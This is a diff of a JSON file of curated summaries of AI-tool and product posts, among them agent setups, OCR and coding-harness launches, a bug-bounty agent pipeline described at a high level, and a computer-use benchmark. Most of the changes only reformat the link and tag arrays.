     "engagement": "25 replies · 15 reposts · 333 likes · 522 bookmarks · 30.9K views",
     "essence": "Leo, a 15-year-old founder shipping viral projects every one to two weeks, documents his whole setup: t3 code to remote into a Mac mini/Linux box, a custom pstack built for t3 and ov2, everything on a home server with Tailscale previews. Opus 5.5 is the daily driver, GPT-6.1 Sol reviews changes and sometimes does backend work, Haiku 5.5 handles codebase search and docs. Notion is long-term memory for both him and the agents, every thread starts as a Linear issue (even tiny fixes) so state is tracked and linked to the PR, and agents must test in a browser. He adds anti-slop oxlint rules, Paper for design, a mix of Capy/Hoplite/Devin for cloud work, Grok bot for managing agents, and Convex when a backend is needed. The most-asked question is for his custom pstack; his answer is to give the post to your agent and have it adapt the setup.",
     "summary": "Less a tool list than an operating model: one issue per thread, explicit memory, model specialization and browser-verified changes - copy the structure, not the exact stack.",
-    "productLinks": ["https://t3.codes/", "https://capy.ai/"],
-    "topicTags": ["agent-workflow", "t3-code", "pstack", "opus-5-5", "linear"],
+    "productLinks": [
+      "https://t3.codes/",
+      "https://capy.ai/"
+    ],
+    "topicTags": [
+      "agent-workflow",
+      "t3-code",
+      "pstack",
+      "opus-5-5",
+      "linear"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1552,8 +1792,16 @@
     "engagement": "2.7K replies · 338 reposts · 3.3K likes · 3.4K bookmarks · 360.3K views",
     "essence": "Hang Huang launched InstaBox, cloud computers for AI agents: a 4 vCPU / 8 GB machine spun up in under a second, built-in computer use, snapshots for cloning, persistent files/packages/config and public URLs for local ports. The launch was invite-only, with early access including 20 vCPU and 40 GB RAM free, and the reply count - 2,732 - is almost entirely people asking for codes or pitching use cases (Godot games, agent hosting, multi-agent chat rooms). Five days later the same account published the pricing rationale: one free 4 vCPU machine with no usage limit, aggressive oversubscription economics and Cloudflare-style free-tier logic. The two posts together are a rare public view of launch demand turning into a pricing decision.",
     "summary": "A strong launch signal for agent-native cloud infra; the follow-up pricing post is the more useful artifact because it explains the unit economics behind the free tier.",
-    "productLinks": ["https://instabox.sh/"],
-    "topicTags": ["instabox", "cloud-computers", "ai-agents", "launch", "pricing"],
+    "productLinks": [
+      "https://instabox.sh/"
+    ],
+    "topicTags": [
+      "instabox",
+      "cloud-computers",
+      "ai-agents",
+      "launch",
+      "pricing"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1569,8 +1817,16 @@
     "engagement": "18 replies · 48 reposts · 1.1K likes · 3.3K bookmarks · 184.8K views",
     "essence": "Emanuele Di Pietro gave Opus 5.5 on Extra High a single performance prompt and let it run for three hours on his app. It found four bugs he had missed: big chats now open 27% faster, switching back is 2x faster, scroll jumps dropped 98%, and reloads fetch the chat once instead of twice; scrolling old messages does 20% less work. The prompt is the artifact - improve startup, screen-open time, content loading and scrolling, find the real bottleneck, apply fixes, and benchmark before and after each one - and the benchmark requirement is what replies single out as the difference between real optimization and cosmetic refactoring. The test app was trysynara.com; one skeptic jokes that the only measurable outcome was a bigger Cloudflare bill.",
     "summary": "A compact, reusable performance prompt whose key instruction is per-fix before/after measurement, not the model or the three-hour runtime.",
-    "productLinks": ["https://www.trysynara.com/"],
-    "topicTags": ["performance", "opus-5-5", "prompts", "benchmarking", "frontend"],
+    "productLinks": [
+      "https://www.trysynara.com/"
+    ],
+    "topicTags": [
+      "performance",
+      "opus-5-5",
+      "prompts",
+      "benchmarking",
+      "frontend"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1586,8 +1842,19 @@
     "engagement": "129 replies · 295 reposts · 2.9K likes · 2.8K bookmarks · 147.2K views",
     "essence": "Datalab's Indra is a 1M-parameter OCR model built for CPU latency: 49 pages/s, 11x faster than PaddleOCR and 17x faster than Tesseract, with an OmniParseBench text score of 41.3 versus 35.8 and 19.3. It returns full layout and line bounding boxes, covers 60 languages and six scripts (Latin, Cyrillic, Greek, Devanagari, Bengali, Chinese), handles any script present in a PDF text layer, and has a special math mode. The trade-off is explicit: at 1M parameters, handwriting, complex tables and large pages degrade, and Datalab points those cases to Chandra. A pip install plus indra-ocr-viewer gives a local speed/settings tester. Replies ask for Telugu, Arabic and Hebrew, report failures on slightly skewed pages, and one developer has already ported it to WASM and runs it in production.",
     "summary": "A purpose-built triage/ingestion OCR model: choose it for throughput on clean documents, and route hard pages to a larger model rather than expecting one tiny model to do everything.",
-    "productLinks": ["https://huggingface.co/datalab-to/indra-ocr", "https://github.com/datalab-to/indra", "https://www.datalab.to/blog/indra-ocr", "https://huggingface.co/datalab-to/chandra-ocr-2"],
-    "topicTags": ["ocr", "indra", "datalab", "cpu-inference", "open-models"],
+    "productLinks": [
+      "https://huggingface.co/datalab-to/indra-ocr",
+      "https://github.com/datalab-to/indra",
+      "https://www.datalab.to/blog/indra-ocr",
+      "https://huggingface.co/datalab-to/chandra-ocr-2"
+    ],
+    "topicTags": [
+      "ocr",
+      "indra",
+      "datalab",
+      "cpu-inference",
+      "open-models"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1603,8 +1870,17 @@
     "engagement": "178 replies · 267 reposts · 2.9K likes · 2K bookmarks · 677.9K views",
     "essence": "Reason launched a coding harness pitched on cost efficiency: it says it beats Codex+Astra on Terminal-Bench 4.0 while costing 22% less, and it offers an unlimited free local tier alongside a Pro product. You can bring your own subscription or API, and the team published its work and a blog explaining the agent. The 678K views and 178 replies made it one of the bigger launches in this batch, but the thread is skeptical rather than celebratory: several users ask how it can be free when the last version demanded money before disappearing, others call it too good to be true, and one asks for a comparison against open-source harnesses. The Terminal-Bench claim is the one to reproduce before trusting the cost claim.",
     "summary": "A cost-focused coding harness worth benchmarking yourself; the free tier and the benchmark claim both need independent verification given the team's prior pricing flip-flop.",
-    "productLinks": ["https://reasonmachines.com/", "https://reasonmachines.com/blog/introducing-reason-agent-1-1"],
-    "topicTags": ["coding-harness", "terminal-bench", "cost", "reason", "agents"],
+    "productLinks": [
+      "https://reasonmachines.com/",
+      "https://reasonmachines.com/blog/introducing-reason-agent-1-1"
+    ],
+    "topicTags": [
+      "coding-harness",
+      "terminal-bench",
+      "cost",
+      "reason",
+      "agents"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1620,8 +1896,16 @@
     "engagement": "122 replies · 191 reposts · 1.4K likes · 957 bookmarks · 168.9K views",
     "essence": "Shashank Kumar open-sourced SlashDocs, a collaboration hub for the HTML and Markdown documents agents now generate. It hosts decks, dashboards and reports in one place, with sharing, permissions and inline comments, and agents can read the feedback and update the same document instead of generating another file and another link. The proof is internal scale at Razorpay: 28,000+ documents created, and more than half of all documents generated there now live in SlashDocs. It is self-hosted, agent-agnostic and open source, with a hosted entry point at razorpay.com/slash-docs. Replies probe the obvious gaps - native Slack integration, how agents read comments (MCP?), comparison with Notion - and one reports a scroll bug, which is fair for a freshly open-sourced product.",
     "summary": "A sensible missing layer for agent output: one canonical, commentable document instead of a trail of regenerated files and links.",
-    "productLinks": ["https://razorpay.com/slash-docs/"],
-    "topicTags": ["documents", "collaboration", "agents", "open-source", "razorpay"],
+    "productLinks": [
+      "https://razorpay.com/slash-docs/"
+    ],
+    "topicTags": [
+      "documents",
+      "collaboration",
+      "agents",
+      "open-source",
+      "razorpay"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1637,8 +1921,16 @@
     "engagement": "7 replies · 14 reposts · 411 likes · 843 bookmarks · 38.2K views",
     "essence": "jaimin points at the Appllama skills repo with a simple pitch - 'any app. any design. any interaction' - framed as the next step beyond a viral reverse-engineering demo: 'you think this is cool? wait until you find out about...' The skills are open-source and free, work with all models, and jaimin recommends Codex because it has native image generation, which helps when the target is a visual interface. The quoted post is just 'Reverse Engineer Anything. Software is done.' Replies ask which model to use and whether Appllama itself is now fully paywalled, which matters because the skills are only useful if the underlying service is still accessible.",
     "summary": "A free skill pack for cloning app flows and UI; the repo is the artifact, the 'software is done' framing is marketing.",
-    "productLinks": ["https://github.com/Appllama/appllama-skills"],
-    "topicTags": ["reverse-engineering", "skills", "codex", "ui", "open-source"],
+    "productLinks": [
+      "https://github.com/Appllama/appllama-skills"
+    ],
+    "topicTags": [
+      "reverse-engineering",
+      "skills",
+      "codex",
+      "ui",
+      "open-source"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1654,8 +1946,16 @@
     "engagement": "21 replies · 13 reposts · 515 likes · 400 bookmarks · 38K views",
     "essence": "Kyle Mistele deleted 40,000 lines of tests, added a pile of oxlint rules to stop the agent from recreating them, and built a control loop that gardens and prunes what remains. The deleted tests were specific anti-patterns, not all tests: anything that mocks modules instead of using Effect's dependency injection and test layers, plus the usual low-value React unit tests. The control loop is documented as a design-control-loop skill on skills.sh, and he says the full thing will be open-sourced. Replies are mostly people asking for the rules, with one useful counterpoint that agents have already stopped writing obviously vacuous tests and the remaining cases are subtler - which is exactly where lint heuristics get hard.",
     "summary": "A strong pattern for keeping agent-written test suites from bloating: encode the banned test shapes as lint rules and let a loop prune the rest.",
-    "productLinks": ["https://www.skills.sh/"],
-    "topicTags": ["testing", "oxlint", "agents", "effect", "code-quality"],
+    "productLinks": [
+      "https://www.skills.sh/"
+    ],
+    "topicTags": [
+      "testing",
+      "oxlint",
+      "agents",
+      "effect",
+      "code-quality"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1671,8 +1971,16 @@
     "engagement": "34 replies · 217 reposts · 2K likes · 3.6K bookmarks · 228.3K views",
     "essence": "Vox's huashu-art-motion is a skill that lets Opus 5.5 generate animations in 35 art styles by writing code: 17 that work for any subject (Van Gogh, Seurat, Bauhaus, Ghibli watercolor, 8-bit, vaporwave), 18 for art-history time travel (Monet, Klimt, Dalí, Hopper, cave painting, Greek pottery) and 9 explainer styles (3Blue1Brown, keynote, whiteboard, Vox explainer, Kurzgesagt). Each style specifies what actually moves, music is synthesized note-by-note on a BPM grid, and a QA script plus an independent subagent watches the finished film. The delivery script blocks more than 0.3 seconds of blank frames and blue-purple backgrounds over 30% of the film, which it explicitly labels AI slop. Docs are Chinese; the post includes a long English prompt to drive it.",
     "summary": "A unusually complete motion-generation pipeline - style cards, beat-synced audio, independent QA and anti-slop gates - worth trying if you already generate video with code.",
-    "productLinks": ["https://github.com/alchaincyf/huashu-art-motion"],
-    "topicTags": ["motion-design", "claude-code", "skills", "video", "art-styles"],
+    "productLinks": [
+      "https://github.com/alchaincyf/huashu-art-motion"
+    ],
+    "topicTags": [
+      "motion-design",
+      "claude-code",
+      "skills",
+      "video",
+      "art-styles"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1688,8 +1996,16 @@
     "engagement": "19 replies · 22 reposts · 487 likes · 235 bookmarks · 17.5K views",
     "essence": "Noah shipped FSearch 0.2, a macOS Finder replacement with a much smaller and faster index: 150x faster to grep a file you just edited, a 74% smaller index (1.5 GB to 388 MB for him), 35% more files covered, 65% less daemon memory on Chromium and 32% less peak memory while indexing. He is explicit that raw speed is not the goal - some areas regress by 0.4x - and that the focus is system impact and coverage, which is why he calls comparisons to fff apples-to-oranges. The repo is public, and the demo videos were made by asking Claude to record them. Replies ask about Homebrew and Windows support, and one makes the sharp point that reading edited files while the index catches up is the feature that actually matters.",
     "summary": "A Finder replacement optimized for low system cost and fresh-file search, not benchmark bragging rights; the small index with broader coverage is the interesting trade.",
-    "productLinks": ["https://github.com/noahdunnagan/fsearch"],
-    "topicTags": ["file-search", "macos", "indexing", "finder", "performance"],
+    "productLinks": [
+      "https://github.com/noahdunnagan/fsearch"
+    ],
+    "topicTags": [
+      "file-search",
+      "macos",
+      "indexing",
+      "finder",
+      "performance"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1705,8 +2021,18 @@
     "engagement": "122 replies · 186 reposts · 2.5K likes · 6.5K bookmarks · 560.5K views",
     "essence": "Treg released an open-source people-search tool for Claude: $0.0089 per lead instead of $600 subscriptions, number one on People Search Bench, zero markup and fully open source. Setup is deliberately agent-native - paste 'set up treg - https://treg.to/llms.txt' into Claude or Codex - and the repo is the same superdesigndev/treg codebase behind its earlier AEO toolkit. The pitch lands because it unbundles one afternoon of research from a monthly subscription, which is exactly what the top replies say they wanted. Others report good results with Hermes and appreciate that Treg shows the cost of each action before running it, while B2B lead-list questions remain unanswered.",
     "summary": "A cheap, open alternative to subscription people-search tools; the per-lead pricing and pre-run cost display are the parts worth copying.",
-    "productLinks": ["https://treg.to/people-search", "https://github.com/superdesigndev/treg", "https://treg.to/llms.txt"],
-    "topicTags": ["people-search", "lead-generation", "open-source", "claude", "treg"],
+    "productLinks": [
+      "https://treg.to/people-search",
+      "https://github.com/superdesigndev/treg",
+      "https://treg.to/llms.txt"
+    ],
+    "topicTags": [
+      "people-search",
+      "lead-generation",
+      "open-source",
+      "claude",
+      "treg"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1722,8 +2048,16 @@
     "engagement": "115 replies · 90 reposts · 568 likes · 394 bookmarks · 44K views",
     "essence": "Maria Gorskikh launched Maritime, a YC F26 company giving startups infrastructure to deploy, manage and scale agents, each with its own computer, starting at $1 per agent per month. The thread keeps the math deliberately simple - 500 agents is $500 - so founders can reason about cost without a spreadsheet. Early users reply that they have already set it up and that it is special, while the sharper questions are about what the bill looks like at real scale and whether the launch video's people were agents or founders. Five days later the same company used the platform to demo a persistent Android phone for shopping on Amazon after Amazon blocked AI assistants, which is a more concrete illustration of the 'each agent gets a computer' thesis than the launch copy.",
     "summary": "A clean per-agent pricing model for agent infrastructure; the Amazon Android demo is the proof that persistent, logged-in computers are the actual product.",
-    "productLinks": ["https://maritime.sh/"],
-    "topicTags": ["maritime", "agent-infrastructure", "yc", "cloud", "pricing"],
+    "productLinks": [
+      "https://maritime.sh/"
+    ],
+    "topicTags": [
+      "maritime",
+      "agent-infrastructure",
+      "yc",
+      "cloud",
+      "pricing"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1740,7 +2074,13 @@
     "essence": "Dmitriy Kovalenko answered a 'let's see AI recreate this' challenge by rebuilding the video as an fframes project with Codex, using only Rust, SVG and shaders. He argues the result is better than the original: fframes is faster, runs without a browser, avoids token waste on flex/grid layout, and has a built-in agentic verification loop for audio, collisions and motion. He pushed past the last 10% of detail and is open-sourcing the template. The thread's best tension is exactly that last 10% - the original creator's point is that taste is the hard part, and a reply pushes back that Kovalenko's transitions are actually better. People also want to know which model (Astra) and whether Codex needed docs for a niche framework.",
     "summary": "A concrete example of code-native video beating a general-purpose editor on iteration speed, with the taste question still unresolved.",
     "productLinks": [],
-    "topicTags": ["fframes", "codex", "rust", "svg", "motion-design"],
+    "topicTags": [
+      "fframes",
+      "codex",
+      "rust",
+      "svg",
+      "motion-design"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1756,8 +2096,18 @@
     "engagement": "14 replies · 3 reposts · 147 likes · 137 bookmarks · 7.5K views",
     "essence": "Athrix spent three hours building a dashboard component and released it as open source in ObsidianUI, with a live docs page at obsidianui.dev/docs/dashboard-shell and a GitHub repo. The pitch is aimed squarely at paid UI libraries - 'every paid ui lib will hate us' - and the component uses duotone icons and FactoryAI in the build. The thread is small but positive, with people asking about the icon pack and recording tool and one noting that three hours for a polished shell is a sweet spot. The repo is also being pushed toward 1,000 stars, so this is early-stage and worth watching rather than adopting blind.",
     "summary": "A free dashboard shell for fast internal tools; the three-hour build is impressive, but the library is young and lightly tested.",
-    "productLinks": ["https://www.obsidianui.dev/docs/dashboard-shell", "https://www.obsidianui.dev/", "https://github.com/Atharvsinh-codez/ObsidianUI"],
-    "topicTags": ["ui-library", "dashboard", "open-source", "react", "components"],
+    "productLinks": [
+      "https://www.obsidianui.dev/docs/dashboard-shell",
+      "https://www.obsidianui.dev/",
+      "https://github.com/Atharvsinh-codez/ObsidianUI"
+    ],
+    "topicTags": [
+      "ui-library",
+      "dashboard",
+      "open-source",
+      "react",
+      "components"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1774,7 +2124,13 @@
     "essence": "Abdulla Ababakre pairs phone-use, his agent that operates a phone, with OpenAI's new Decisions API, which lets an app choose the right model, tool or action in near real time. OpenAI says Decisions is up to 10x faster than GPT-6 Luna through the Responses API, and the combo is aimed at the step where a phone agent has to decide what to tap next without a full model round-trip. Phone-use currently runs on Ababakre's own device cloud, with a local version promised soon. The thread is tiny, but the one substantive question - whether it can drive a physical iPhone rather than a hosted device - points at the gap between a demo and a product.",
     "summary": "A promising latency fix for phone agents; the missing piece is local/physical-device support, which is still promised rather than shipped.",
     "productLinks": [],
-    "topicTags": ["phone-use", "openai", "decisions-api", "agents", "latency"],
+    "topicTags": [
+      "phone-use",
+      "openai",
+      "decisions-api",
+      "agents",
+      "latency"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1790,8 +2146,16 @@
     "engagement": "31 replies · 46 reposts · 1K likes · 1.7K bookmarks · 141.1K views",
     "essence": "Capy added Guided Reviews: instead of dumping a big diff in file order, it opens with a before/after overview, groups files into chapters explained in plain language, and orders the core change first with database, tests and generated files last. It shipped in Capy 0.4.4 alongside marketplace plugins, custom models on your own key and desktop threads without a project. The demo is polished enough that the main reply thread is an accusation - this looks like Linear's guided diffs - and luffy answers that it was inspired by Linear but Capy had it in v1, lost it in v2 and is bringing it back with its own review agent. Either way, the interaction pattern is becoming table stakes for agent-era code review.",
     "summary": "A good default structure for reviewing agent-sized diffs - overview, chapters, core-first ordering - regardless of whether Capy or Linear ships it better.",
-    "productLinks": ["https://capy.ai/"],
-    "topicTags": ["code-review", "capy", "pull-requests", "linear", "agents"],
+    "productLinks": [
+      "https://capy.ai/"
+    ],
+    "topicTags": [
+      "code-review",
+      "capy",
+      "pull-requests",
+      "linear",
+      "agents"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1807,8 +2171,17 @@
     "engagement": "1 bookmark · 879 views",
     "essence": "Serg pitches blogr.ai as an AI writer that does the whole loop rather than dumping random posts: it maps your niche, writes the articles, publishes them and watches the rankings, with the first article free. The post got almost no distribution - one bookmark and 879 views - which makes it a useful counterexample to the idea that launch copy alone creates traction. The same thread also promotes bytemail 1.0, a native Swift email app for Mac that handles Gmail, iCloud, Outlook, Yahoo and IMAP in one window with no web wrapper and no server in the mail path, suggesting Serg is shipping multiple small products rather than focusing on one.",
     "summary": "A standard AI-SEO content loop with no proof yet; the launch's near-zero engagement is the more informative signal.",
-    "productLinks": ["https://blogr.ai/", "https://bytemailapp.com/"],
-    "topicTags": ["seo", "content-automation", "blogr", "email", "indie"],
+    "productLinks": [
+      "https://blogr.ai/",
+      "https://bytemailapp.com/"
+    ],
+    "topicTags": [
+      "seo",
+      "content-automation",
+      "blogr",
+      "email",
+      "indie"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -1825,7 +2198,13 @@
     "essence": "A straight-up Bangalore burger recommendation: The Burgery In in Indiranagar does buff and chicken burgers, really crispy fries and a peanut butter shake that the poster calls soooo flavorful. In the thread she narrows it to the Ultimate and Frizzled burgers - the Frizzled has a melted crunchy layer of cheese - and says she liked it better than Truffles. Replies are the useful part: one compares it with Smash Guys (good burger, excellent bone-marrow side), another recommends Guerrilla Diner, and a third went for a birthday dinner and called it the best burger of their life. It is a low-stakes bookmark, but a well-validated one.",
     "summary": "A concrete Indiranagar burger pick with enough reply confirmation to trust; go for the Frizzled and the peanut butter shake.",
     "productLinks": [],
-    "topicTags": ["bangalore", "indiranagar", "burgers", "food", "recommendation"],
+    "topicTags": [
+      "bangalore",
+      "indiranagar",
+      "burgers",
+      "food",
+      "recommendation"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1841,8 +2220,15 @@
     "engagement": "66 replies · 174 reposts · 3.8K likes · 5.8K bookmarks · 163.8K views",
     "essence": "Maze launches /untangle-codebase, a skill for coding agents that cleans messy code: leaky abstractions, copy-paste, temporary workarounds and useless wrappers. A demo video is attached. A self-reply links the skill file (SKILL.md in the caldoai/skills repo). Asked how the demo video was made, he says he did not tell the agent how to do it and it chose the approach itself. Replies ask whether it only works for TypeScript, because the demos use TypeScript. One reply says it looks like Matt's improve-codebase-design skill, but acts at once instead of talking first. Another says skills will soon need their own benchmark index.",
     "summary": "A one-file cleanup skill to try on a messy repo. Read the diff it makes; the pitch is about acting, not reviewing.",
-    "productLinks": ["https://github.com/caldoai/skills/blob/main/skills/untangle-codebase/SKILL.md"],
-    "topicTags": ["claude-code", "skills", "refactoring", "code-quality"],
+    "productLinks": [
+      "https://github.com/caldoai/skills/blob/main/skills/untangle-codebase/SKILL.md"
+    ],
+    "topicTags": [
+      "claude-code",
+      "skills",
+      "refactoring",
+      "code-quality"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "video"
   },
@@ -1859,7 +2245,13 @@
     "essence": "vulnix posts a very long prompt for a fresh Hermes Agent session. It asks the agent to really build an authorized bug-bounty system for HackerOne programs: profiles, a workspace, validators, a Kanban board named bug-bounty, scheduler scripts, cron jobs and tests, then run an offline smoke test. Four isolated profiles do the work: bounty-scout (public directory and policy research only), bounty (researcher), bounty-reviewer (tries to reject each finding and reruns the proof) and bounty-submitter (revalidates and submits through the official form only after every gate passes). All four use deepseek-v4.1-flash through the opencode-go provider, and risky commands run inside Bubblewrap. Hard rules: only policy-authorized scope, paid programs only, no CAPTCHA or authentication bypass, no DoS, no fabricated evidence, a harmless local PoC for every finding, duplicate searches before handoff, and submit exactly once. A human is needed only for login or CAPTCHA at the submission step. An hourly scout script and a five-minute progress watcher send short alerts. No replies were captured.",
     "summary": "A full reference prompt for an unattended bounty pipeline with strict scope and human-only submission gates. Read the safety rules before you reuse any part.",
     "productLinks": [],
-    "topicTags": ["hermes-agent", "bug-bounty", "hackerone", "kanban", "agent-automation"],
+    "topicTags": [
+      "hermes-agent",
+      "bug-bounty",
+      "hackerone",
+      "kanban",
+      "agent-automation"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -1875,8 +2267,16 @@
     "engagement": "9 replies · 2 reposts · 57 likes · 130 bookmarks · 7.4K views",
     "essence": "Dennison promotes his developer skill pack for Claude, built around four UX skills. /ux-paths writes exhaustive user-journey stories from the codebase with parallel sub-agents. /ux-flow scores each journey for friction and redundancy and files ranked simplification issues. /ux-walker walks every story in a real browser, checks alignment and spacing with a geometry-audit script, and files GitHub issues. /ux-auto-improve loops one app section per round: a cheap reviewer critiques, Opus or Fable judges and argues against, cheap implementers build the survivors with regression tests, and each fix gets a narrated before and after walkthrough video. His suggested run is /goal with ux-paths, ux-flow, ux-walker and ux-visual, then three rounds of ux-auto-improve in /loop. He says it does more than impeccable, but he does not use impeccable. Replies ask how it compares to impeccable and ask for simple before and after demos. The claims of one-shot SaaS apps have no proof in the thread.",
     "summary": "A UX audit and auto-fix loop worth testing on one app section first. The strongest claims are boasts without evidence.",
-    "productLinks": ["https://github.com/dennisonbertram/developer-skill-pack"],
-    "topicTags": ["claude-code", "skills", "ux", "agent-loops", "browser-testing"],
+    "productLinks": [
+      "https://github.com/dennisonbertram/developer-skill-pack"
+    ],
+    "topicTags": [
+      "claude-code",
+      "skills",
+      "ux",
+      "agent-loops",
+      "browser-testing"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1893,7 +2293,13 @@
     "essence": "Mr Nikola says ChatGPT applied to 500 jobs while he slept and 12 interview calls came within 24 hours. The thread gives the prompts. Step 1: upload your resume and ask ChatGPT to act as a senior recruiter and list 20 job titles you fit with the ATS keywords for each. Step 2: rewrite the resume into a master template with the Google XYZ formula and no red flags. Step 3: turn on Agent mode with the + sign so ChatGPT can open LinkedIn and Indeed. Step 4: ask it to find matching postings from the last 7 days and build a spreadsheet with links, match scores and a tailored resume version for each. The post has about 1.1M views, but the replies are mostly doubtful: 'clickbait', 'seems untrue', and jokes about cancelled interviews.",
     "summary": "Steps 1, 2 and 4 are a sound resume and tracking routine. The 500-applications and 12-calls result is unproven.",
     "productLinks": [],
-    "topicTags": ["chatgpt", "job-search", "resume", "ats", "agent-mode"],
+    "topicTags": [
+      "chatgpt",
+      "job-search",
+      "resume",
+      "ats",
+      "agent-mode"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -1910,7 +2316,14 @@
     "essence": "Aakash Gupta warns that a vibe-coded app can face a six-figure legal bill before the first sale. His list of flat per-violation risks: COPPA, Google Fonts, session replay, CAN-SPAM, auto-renewal rules and the 6 dollar DMCA copyright agent registration. The video is built to be sent to Claude with the request to fix everything. A self-reply lists the sources: FTC civil penalty notice and CAN-SPAM guide, 16 CFR 1.98, LG Muenchen I 3 O 17493/20, Cal. Penal Code 637.2, 17 USC 504(c) and 512(c), and 37 CFR 201.3. It says this is not legal advice. Replies add useful corrections: COPPA applies only if the app targets children or knows a user is under 13, CAN-SPAM has no private lawsuits, and the Google Fonts case is a German ruling. Another reply confirms it is real if you have German visitors, and the fix is to self-host fonts. Two replies want a text file because agents cannot watch video.",
     "summary": "A good pre-launch checklist, but the worst-case numbers are not typical. Self-host fonts, check COPPA scope, and read the replies' corrections.",
     "productLinks": [],
-    "topicTags": ["compliance", "coppa", "gdpr", "can-spam", "vibe-coding", "legal"],
+    "topicTags": [
+      "compliance",
+      "coppa",
+      "gdpr",
+      "can-spam",
+      "vibe-coding",
+      "legal"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "video"
   },
@@ -1926,8 +2339,16 @@
     "engagement": "353 replies · 745 reposts · 7.3K likes · 8.2K bookmarks · 699.1K views",
     "essence": "govi releases terminal-mac, a whole macOS that runs inside your existing terminal. You give the agent its own Mac and keep yours, watch it work live beside your terminal, and get computer use through MCP, a CLI and a skill. It is free and open source (govijr/terminal-mac). In the thread he says it uses Apple's virtualization framework with a real macOS guest and no emulation. It takes 4 GB RAM by default (set with --memory) and the memory stays flat while the agent works. The terminal viewer is about 10 MB, and the setup is kept after the first run. He admits it does not handle some cases yet. Replies suggest pixelgui.com for better kitty-graphics support (tmux, partial updates) and ask for rollback checkpoints, which the README lists as planned. The post has 7.3K likes and 8.1K bookmarks.",
     "summary": "A clean way to give an agent its own Mac without touching yours. Check the RAM cost and the missing checkpoints before you rely on it.",
-    "productLinks": ["https://github.com/govijr/terminal-mac"],
-    "topicTags": ["computer-use", "macos", "virtualization", "mcp", "open-source"],
+    "productLinks": [
+      "https://github.com/govijr/terminal-mac"
+    ],
+    "topicTags": [
+      "computer-use",
+      "macos",
+      "virtualization",
+      "mcp",
+      "open-source"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "video"
   },
@@ -1943,8 +2364,16 @@
     "engagement": "4 replies · 1 reposts · 92 likes · 160 bookmarks · 2.9K views",
     "essence": "Dara posts an image of a CLAUDE.md section called 'Two-way doors swing freely' and says something like it helps a lot. The image looks like a GitHub-rendered file from the linked d-stack repo (SunkenInTime/d-stack). The rule: trust the agent with whole problems, take the full scope and use as many subagents as needed. Walk through two-way doors and show the result after. Stop at one-way doors. Do not ask if the answer would be a rubber stamp, and run something instead of asking when a run can answer the question. Save questions for taste and product calls, one at a time. Once a one-way door is opened, it stays open for that work, including for subagents, unless the real situation differs from what was approved. Replies say it is too verbose and could be one or two sentences. One reply suggests a short version: make all decisions yourself, save questions in a doc for later, and move on, ideally as a skill.",
     "summary": "A reusable autonomy rule for CLAUDE.md. Copy the idea, then shorten it to fit your own work.",
-    "productLinks": ["https://github.com/SunkenInTime/d-stack"],
-    "topicTags": ["claude-md", "agents", "autonomy", "prompts", "subagents"],
+    "productLinks": [
+      "https://github.com/SunkenInTime/d-stack"
+    ],
+    "topicTags": [
+      "claude-md",
+      "agents",
+      "autonomy",
+      "prompts",
+      "subagents"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image"
   },
@@ -1961,7 +2390,12 @@
     "essence": "An ex-Google ads specialist shows how to read a competitor's tracking from the public Google Tag Manager file. View the page source and search for GTM-, copy the ID, and open googletagmanager.com/gtm.js?id= with that ID. Search for AW- to see each Google Ads conversion, 'event' to see conversion names such as demo_booked or trial_started (their funnel in order), and 'value' to see what each step is worth to them. With a competitor's demo value you can decide whether you can outbid them on shared keywords. The thread ends with an agency pitch. Replies add that it only works if the container is not restricted, that server-side GTM hides it, that an old tool called GtmSpy did this, and that you should lock down your own container.",
     "summary": "A quick 10-minute recon trick for any competitor site. The post is also a lead-generation pitch, so treat the framing with care.",
     "productLinks": [],
-    "topicTags": ["google-tag-manager", "competitor-analysis", "ads", "growth"],
+    "topicTags": [
+      "google-tag-manager",
+      "competitor-analysis",
+      "ads",
+      "growth"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1978,7 +2412,13 @@
     "essence": "Athrix benchmarks five computer-use tools on 40 real desktop tasks (forms, icons, tiny buttons, a calculator, a text editor) on one Ubuntu desktop, 8-core CPU and no GPU, checked against real app state. Tasks completed: Cua Driver 90% (36 of 40), agent-desktop 88% (35), UI-TARS 82% (33), OmniParser 52% (21), Open Interpreter 32% (13). Median time per action: agent-desktop 471 ms, Cua 1.1 s, Open Interpreter 2.8 s, OmniParser 53.6 s, UI-TARS 88.8 s. Said done but nothing happened: Cua 0 of 42, agent-desktop 1, OmniParser 1, UI-TARS 7, Open Interpreter 29. Peak memory: agent-desktop 90 MB, Cua 142 MB, Open Interpreter 1.41 GB, OmniParser 11.25 GB, UI-TARS 17.69 GB. The thread notes UI-TARS got 7 x 8 = 2 on the calculator. Replies praise agent-desktop, and its author says a new release will beat this.",
     "summary": "Accessibility-tree tools beat vision models on speed, memory and honest 'done' reports in this CPU-only test. See the two agent-desktop entries.",
     "productLinks": [],
-    "topicTags": ["computer-use", "benchmark", "agent-desktop", "cua", "ui-tars"],
